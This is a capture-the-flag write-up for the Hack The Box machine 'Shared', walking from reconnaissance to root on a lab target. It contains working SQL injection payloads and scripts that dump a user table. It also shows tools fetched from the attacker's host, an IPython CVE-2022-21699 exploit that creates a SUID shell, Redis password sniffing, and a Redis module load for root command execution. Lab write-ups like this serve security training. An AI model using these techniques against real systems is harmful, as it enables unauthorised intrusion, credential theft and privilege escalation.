---
title: "HTB - Shared"
excerpt: "Hack The Box Machines • Linux • Medium"
layout: "htb_machine"
htb:
  machine:
    name: "Shared"
    url: "https://app.hackthebox.com/machines/Shared"
  avatar: "/assets/images/htb-machines/avatars/shared.png"
  difficulty: "Medium"
  os: "Linux"
  author:
    - name: "Nauten #27582"
      url: "https://app.hackthebox.com/users/27582"
---


## Synopsis

Shared is a medium Linux machine provided by Hack The Box that features a website with a virtual hostname that is vulnerable to SQL injection. Successful exploitation of this vulnerability provides us with the password for a user called `james_mason`. With these credentials we are able to login via SSH and elevate privileges to a user called `dan_smith` by exploiting a vulnerable cron job. The user can then reverse-engineer an executable to recover the password for the local Redis service and load a special shared object module using `LOAD MODULE` to execute commands as root.


## Reconnaissance

Let's set up our environment and run a TCP port scan with [RustScan](https://github.com/RustScan/RustScan) to find any open ports on the machine.

```bash
$ echo "rhost=10.10.11.172" > .env
$ . ./.env

$ rustscan -a $rhost -u 5000 -- -Pn -sV -oN scan.txt
```
```
Nmap scan report for 10.10.11.172
Host is up, received user-set (0.025s latency).
Scanned at 2022-11-12 09:20:29 CST for 14s

PORT    STATE SERVICE  REASON  VERSION
22/tcp  open  ssh      syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp  open  http     syn-ack nginx 1.18.0
443/tcp open  ssl/http syn-ack nginx 1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The scan reports that the SSH service, HTTP service, and HTTPS service are running on ports `22`, `80`, and `443` respectively.

## Web

### Enumeration

Upon visiting port `80`, we are redirected to the domain `shared.htb`. Let's add this domain to our `/etc/hosts` file with the corresponding IP address as usual.

```bash
$ echo -e "$rhost\tshared.htb" | sudo tee -a /etc/hosts
```

Now, let's add the domain to our environment file...

```bash
$ echo "domain=shared.htb" >> .env
$ . ./.env
```

...and visit `shared.htb` in a browser session being proxied through the [BurpSuite](https://portswigger.net/burp) HTTP proxy.

![homepage_image](/assets/images/htb-machines/shared/homepage.png)

#### Walking the Application

When exploring the content of the website, we eventually discover the checkout page at `/index.php?controller=cart&action=show`. When we hover over the `PROCEED TO CHECKOUT` button, we can see that it will send us to `https://checkout.shared.htb`. Let's add this virtual hostname to our `/etc/hosts` file so we can view its content.

```bash
$ sudo sed -E -i 's/(shared.htb).*/\1 checkout.\1/' /etc/hosts
```

Now if we add an item to our cart and go to `/index.php?controller=cart&action=show` we can click the `PROCEED TO CHECKOUT` button to be redirected to `https://checkout.shared.htb`

![checkout_image](/assets/images/htb-machines/shared/checkout.png)

#### Investigating Functionality

It's interesting how this site is able to determine which item we had in our cart considering we did not supply any `GET` or `POST` parameters. Let's investigate!

Looking at the initial request we sent to `checkout.shared.htb` in the BurpSuite site map, we can see that our request contains an unusual cookie called `custom_cart`. The value of this cookie can be automatically decoded by highlighting it, revealing a JSON object with the product code and quantity of the checkout item.

![burpsuite_cookie_image](/assets/images/htb-machines/shared/burpsuite-cookie.png)

We can infer that the site uses the supplied product code in `custom_cart` to find the price of the item since we do not supply the price, but only the product code. This activity is likely handled by some type of database solution such as an `SQL` server. With this in mind, we can check if this functionality is vulnerable to `SQL` or `NoSQL` injection

#### Vulnerability Discovery

Let's input some basic SQL injection payloads to the `custom_cart` cookie in the BurpSuite repeater tab to see if SQL injection is possible.

![burpsuite_injection_image_0](/assets/images/htb-machines/shared/burpsuite-injection-0.png)

`{"CRAAFTKP'#":"1"}`

The response to the first payload suggests that SQL injection is possible but we can make sure by sending a payload that should evaluate to `false`, and one that should be `true`.

```python
#!/usr/bin/env python3
# ** makepayload.py **

from urllib.parse import quote
from sys import argv

if len(argv) == 2:
        sqli = argv[1]

        sqli = sqli.replace('\\', '\\\\')
        sqli = sqli.replace('"','\\"')

        print(quote('{"' + argv[1] + '":"1"}'))
```

```bash
chmod +x makepayload.py
true=$(./makepayload.py "' OR 1=1#")
false=$(./makepayload.py "' AND 1=2#")

url="https://checkout.shared.htb"

curl -k -s $url -b "custom_cart=$true" | sed 's/^ *//' > true.html
curl -k -s $url -b "custom_cart=$false" | sed 's/^ *//' > false.html
```

This should leave you with two files called `false.html` and `true.html`. To find the difference between the two response bodies we can use `diff`.

```bash
$ diff false.html true.html
```
```diff
37,39c37,39
< <td>Not Found</td>
< <td>0</td>
< <td>$0,00</td>
---
> <td>53GG2EF8</td>
> <td>1</td>
> <td>$23,90</td>
45c45
< <th scope="col">$0,00</th>
---
> <th scope="col">$23,90</th>
```

The `false` query returns `Not Found` and zero values for the quantity and price while the `true` query returns a product entry. This is definitely enough evidence of an SQL injection vulnerability to begin exploitation.

### Exploitation

We have already determined that boolean-based blind SQL injection is possible with the `true` or `false` queries, but there is a good chance we can use `UNION SELECT` queries to exfiltrate database values without having to use a side-channel.

#### Union Query Exfiltration

Let's first find the number of columns in the original query so we can match it in our `UNION SELECT` extension.

```bash
$ payload=$(./makepayload.py "' UNION SELECT 'c0lumn1','c0lumn2','c0lumn3'#")

$ curl -k -s "https://checkout.shared.htb" -b "custom_cart=$payload" | \
	sed 's/^ *//' |
	egrep '</?td>'
```
```html
<td>c0lumn2</td>
<td>1</td>
<td>$</td>
```

Notice how the response contains the value we sent in the second column. This means we can exfiltrate data through the second column.

Now let's create a script to get any raw value from the database.

```bash
#!/bin/bash
# ** sqli.sh **

[ -z "$SELECT" ] && echo "SELECT=* FROM=* WHERE=* $0" && exit

payload="' UNION SELECT '',$SELECT,''"

[ -z "$FROM" ] || payload="$payload FROM $FROM"
[ -z "$WHERE" ] || payload="$payload WHERE $WHERE" 

echo $payload

payload=$(./makepayload.py "$payload#")

curl -k -s "https://checkout.shared.htb" -b "custom_cart=$payload" |
	egrep '</?td>' |
	head -1 |
	sed -E 's/^ *<td>(.*)<\/td>$/\1/'
```

Then we can see if we can get the available database names. Remember that this database is probably MySQL because the `#` comment is working.

##### Extracting Available Databases

```bash
$ chmod +x sqli.sh

$ SELECT="group_concat(schema_name)" \
FROM="information_schema.schemata"   \
	./sqli.sh
```
```
information_schema,checkout
```

There is a database called `checkout` that we should explore. Let's find the names of its tables.

##### Extracting Table Names

```bash
$ SELECT="group_concat(table_name)" \
FROM="information_schema.tables"    \
WHERE="table_schema='checkout'"     \
	./sqli.sh
```
```
user,product
```

The `user` table seems interesting. Let's find the column names and dump the table contents.

##### Extracting Column Names

```bash
$ SELECT="group_concat(column_name)" \
FROM="information_schema.columns"    \
WHERE="table_name='user'"            \
	./sqli.sh
```
```
id,username,password
```

##### Dumping Tables
```bash
$ SELECT="group_concat(concat(id,0x7c,username,0x7c,password))" \
FROM="checkout.user" \
	./sqli.sh
```
```
1|james_mason|--REDACTED--
```

There is only one result, but we got what looks like an MD5 hash in the `password` column for the user `james_mason`.

## Shell as james_mason

Let's try to crack the hash using [John the Ripper](https://github.com/openwall/john)

### Hash Cracking

```bash
$ hash="--REDACTED--" # Hash here
$ echo "james_mason:$hash" > md5.john
$ john md5.john \
	--format="raw-md5" \
	--wordlist="/home/bryan/wordlist/rockyou.txt"
```
```
...
james_mason:--REDACTED--
...
```

Using these credentials on the target's SSH server will land us a shell as `james_mason`.

```bash
$ password="--REDACTED--" # Password here
$ sshpass -p $password ssh "james_mason@$rhost"
```

There is no user flag in our home directory so we might have to do some privilege escalation.

### Privilege Escalation

We will be using LinPEAS from [PEASS-ng](https://github.com/carlospolop/PEASS-ng) to look for any useful information on the machine. We will also be using [pspy](https://github.com/DominicBreuker/pspy) to snoop on processes.

#### Scripts

```bash
# attacker machine
$ lhost="10.10.14.10" # Your IP address
$ cd $(mktemp -d)
$ wget \
	"https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64" \
	"https://github.com/carlospolop/PEASS-ng/releases/download/20220522/linpeas.sh"
$ php -S $lhost:80
```

```bash
# target machine (SSH)
$ lhost="10.10.14.10" # Attacker's IP address
$ mkdir .sneak
$ cd .sneak
$ wget "http://$lhost/pspy64" "http://$lhost/linpeas.sh"
$ bash ./linpeas.sh | tee linpeas.log
```

We don't get anything that blatantly stands out in the `linpeas.sh` output. Let's try running `pspy64` for a few minutes.

```bash
# target machine (SSH)
$ chmod +x pspy64
$ timeout 3m ./pspy64 | tee pspy.log
```

Looking at the output, user ID `0` and user ID `1001` seem to be running routine commands. UID `0` is `root` and User ID `1001` turns out to be user `dan_smith`, declared in `/etc/passwd`. It can be noted that `dan_smith` runs an interesting command every minute.

```bash
/bin/sh -c /usr/bin/pkill ipython; cd /opt/scripts_review/ && /usr/local/bin/ipython
```

The user enters the `/opt/scripts_review` directory and executes `/usr/local/bin/ipython`.

#### CVE-2022-21699

After doing some research into `ipython`, we come accross a [vulnerability advisory](https://github.com/advisories/GHSA-pq7m-3gw7-gq5x) that details a code execution flaw.

> We’d like to disclose an arbitrary code execution vulnerability in IPython that stems from IPython executing untrusted files in CWD. This vulnerability allows one user to run code as another.

Let's check if the version on the machine is vulnerable.

```bash
# target machine (SSH)
$ /usr/local/bin/ipython --version
```
```
8.0.0
```

It does seem to be vulnerable. Since the routine command executed by `dan_smith` is run in the `/opt/scripts_review` directory, we could exploit the vulnerability if `/opt/scripts_review` is writable.

```bash
# target machine (SSH)
$ ls -la /opt/scripts_review
```
```
total 8
drwxrwx--- 2 root developer 4096 Jul 14 13:46 .
drwxr-xr-x 3 root root      4096 Jul 14 13:46 ..
```

It is writable by those in the `developer` group. According to the output of the `id` command, our current user is actually part of this group.

##### Exploitation

Let's test our hypothesis by following the instructions in the advisory to execute code as `dan_smith`.

```bash
#!/bin/bash
# ** exploit.sh **

exploitdir="/opt/scripts_review"

cmd="cp /bin/sh /tmp/dan_smith_sh;chmod a+xs /tmp/dan_smith_sh"

mkdir -m 777 "$exploitdir/profile_default"
mkdir -m 777 "$exploitdir/profile_default/startup"
echo "__import__('os').popen('$cmd')" > "$exploitdir/profile_default/startup/x.py"
```

After running the script and waiting a minute, our SUID shell should be at `/tmp/dan_smith_sh`.

```bash
# target machine (SSH)
$ /tmp/dan_smith_sh -p
```

This should get us a shell as `dan_smith`.

## Shell as dan_smith

The first flag is located at `/home/dan_smith/user.txt`

### Stabilizing Shell

Let's copy the contents of `/home/dan_smith/.ssh/id_rsa` over to the attacker machine and use it to log in as `dan_smith` via SSH to get a more stable shell.

```bash
# attacker machine
$ chmod 600 dan_smith_id_rsa
$ ssh -i dan_smith_id_rsa "dan_smith@$rhost"
```

### Enumeration

When running the `id` command, we learn that our current user is part of the `sysadmin` group. Let's see what this group has special access to.

```bash
# target machine (SSH)
$ find / -group sysadmin 2>/dev/null
```
```
/usr/local/bin/redis_connector_dev
```

The name of this file suggests that it has something to do with a key-value data storage solution known as `Redis`. When we execute `/usr/local/bin/redis_connector_dev`, it prints a log message saying `Logging to redis instance using password` and what looks like the output of the `INFO Server` redis query.

### Redis

Let's gather some basic info on the file and see what's going on behind the scenes.

```bash
# target machine (SSH)
$ file /usr/local/bin/redis_connector_dev|tr ',' '\n'
```
```
/usr/local/bin/redis_connector_dev: ELF 64-bit LSB executable
 x86-64
 version 1 (SYSV)
 dynamically linked
 interpreter /lib64/ld-linux-x86-64.so.2
 Go BuildID=sdGIDsCGb51jonJ_67fq/_JkvEmzwH9g6f0vQYeDG/iH1iXHhyzaDZJ056wX9s/7UVi3T2i2LVCU8nXlHgr
 not stripped
```

Based on the output of the `file` command, we can note a few things about the file:
*   It is an ELF x86-64 executable
*   It was built with a Go compiler (hence the Go BuildID)
*   It is not stripped


#### Finding the Password

Since the redis RESP protocol operates in plain-text, we might be able to capture the password with a packet monitor. First, let's copy the file to the attacker machine.

```bash
# attacker machine
$ scp -i dan_smith_id_rsa "dan_smith@$rhost:/usr/local/bin/redis_connector_dev" .
$ chmod +x redis_connector_dev && ./redis_connector_dev
```
```
dial tcp 127.0.0.1:6379: connect: connection refused
```

We get an error complaining that TCP port `6379` is closed on the loopback address. We can open that port by running netcat in a separate tab.

```bash
# attacker machine
$ nc -lv 127.0.0.1 6379
```

Now if we run `redis_connector_dev` we get some output to the netcat session.

```
Connection received on localhost 35468
*2
$4
auth
$16
--REDACTED--
```

The strings `auth` and `--REDACTED--` are passed. The second string seems like it may be the password so let's try using that with `redis-cli` back on the target machine.

```bash
# target machine (SSH)
$ redis-cli -a "$password" INFO server
```

The `INFO server` command is successfully executed. While running some extra enumeration commands we find out that the redis store is pretty much empty.

```bash
# target machine (SSH)
$ redis-cli -a "$password" INFO keyspace
```

After some research on redis, we come across [this](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#redis-rce) page which suggests different methods of achieving RCE on a redis server. This is useful for us because the user running the redis server is `root` meaning we will execute commands as `root` if RCE is possible.

#### Loading Modules

One method is to load a special shared object file using `MODULE LOAD` with `redis-cli`. We can build the shared object from the [source code](https://github.com/n0b0dyCN/RedisModules-ExecuteCommand) on the attacker machine, then copy `module.so` to the target.

```bash
# target machine (SSH)
command="cp /bin/sh /root_sh;chmod a+xs /root_sh"

redis-cli -a "$password" MODULE LOAD ~/module.so &&
	redis-cli -a "$password" system.exec "$command"

/root_sh -p
```

Running this should land us a shell as `root`. The root flag can then be found at `/root/root.txt`.